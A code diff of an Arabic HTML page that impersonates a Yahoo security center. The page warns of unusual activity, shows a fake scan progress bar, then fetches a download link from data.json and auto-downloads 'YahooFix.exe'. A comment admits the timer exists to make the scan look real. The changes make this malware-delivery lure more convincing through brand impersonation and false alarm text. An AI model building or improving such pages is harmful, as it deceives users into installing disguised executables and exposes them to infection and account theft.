@@ -2,52 +2,52 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>مركز حماية حسابات ياهو</title>
+    <title>مركز حماية ياهو | Yahoo Security Center</title>
     <style>
-        body { background: #f9f9f9; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 450px; }
-        .logo { width: 100px; margin-bottom: 20px; }
-        .loader-bar { width: 100%; background: #eee; height: 10px; border-radius: 5px; margin: 20px 0; overflow: hidden; }
-        .progress { width: 0%; height: 100%; background: #6001d2; transition: 0.3s; }
-        h2 { color: #6001d2; margin-bottom: 10px; }
-        p { color: #555; font-size: 14px; }
-        .status { font-weight: bold; color: #6001d2; margin-top: 10px; }
+        body { background: #f1f1f1; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 450px; border-top: 6px solid #6001d2; }
+        .yahoo-logo { width: 150px; margin-bottom: 25px; }
+        h2 { color: #6001d2; font-size: 22px; margin-bottom: 15px; }
+        .description { color: #444; font-size: 15px; line-height: 1.6; }
+        .loading-box { width: 100%; background: #e0e0e0; height: 12px; border-radius: 6px; margin: 25px 0; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: #6001d2; transition: 0.1s linear; }
+        .status-text { color: #777; font-size: 13px; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" class="logo">
-        <h2>فحص الأمان جارٍ...</h2>
-        <p>يرجى الانتظار، نقوم بتحليل التهديدات وتجهيز أداة الإصلاح YahooFix لجهازك.</p>
+    <div class="container">
+        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo Logo" class="yahoo-logo">
         
-        <div class="loader-bar">
-            <div class="progress" id="prg"></div>
+        <h2>فحص الأمان والخصوصية</h2>
+        <p class="description">لقد تم رصد نشاط غير معتاد. يرجى الانتظار بينما نقوم بتجهيز أداة <b>Yahoo Security Fix</b> المخصصة لجهازك لتأمين حسابك فوراً.</p>
+        
+        <div class="loading-box">
+            <div class="progress-fill" id="bar"></div>
         </div>
         
-        <div class="status" id="stat">جاري فحص النظام (0%)</div>
+        <div class="status-text" id="status">جاري فحص الثغرات الأمنية (0%)</div>
     </div>
 
     <script>
-        let width = 0;
-        const prg = document.getElementById('prg');
-        const stat = document.getElementById('stat');
+        let progress = 0;
+        const bar = document.getElementById('bar');
+        const statusText = document.getElementById('status');
 
-        // محاكاة عملية التحميل
         const interval = setInterval(() => {
-            if (width >= 100) {
+            progress++;
+            bar.style.width = progress + '%';
+            statusText.innerText = "جاري تحميل أداة الإصلاح... (" + progress + "%)";
+
+            if (progress >= 100) {
                 clearInterval(interval);
-                stat.innerText = "بدء تنزيل أداة الإصلاح فوراً...";
+                statusText.innerText = "بدء التنزيل التلقائي لملف YahooFix.exe...";
                 
-                // جلب رابط التنزيل من data.json وبدء التحميل
+                // جلب الرابط المباشر من data.json والبدء بالتحميل
                 fetch('./data.json').then(r => r.json()).then(data => {
                     window.location.href = data.download_url;
                 });
-            } else {
-                width++;
-                prg.style.width = width + '%';
-                stat.innerText = `جاري تجهيز ملف الإصلاح (${width}%)`;
             }
-        }, 50); // سرعة العداد (5 ثواني تقريباً للوصول لـ 100%)
+        }, 60); // العداد يستغرق حوالي 6 ثوانٍ ليعطي انطباعاً بالفحص الحقيقي
     </script>
 </body>
 </html>
